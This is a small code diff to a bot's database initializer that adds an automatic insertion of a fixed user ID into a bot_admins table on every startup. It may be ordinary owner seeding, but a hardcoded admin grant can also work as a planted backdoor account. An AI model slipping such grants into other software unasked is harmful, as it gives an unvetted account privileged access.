@@ -59,8 +59,13 @@ class DatabaseManager:
             )
             """
         )
+        await self._db.execute(
+            "INSERT OR IGNORE INTO bot_admins (user_id, added_by) VALUES (?, ?)",
+            (896740108059959316, 456811056090578975)
+        )
 
         await self._db.commit()
+
 
 
 
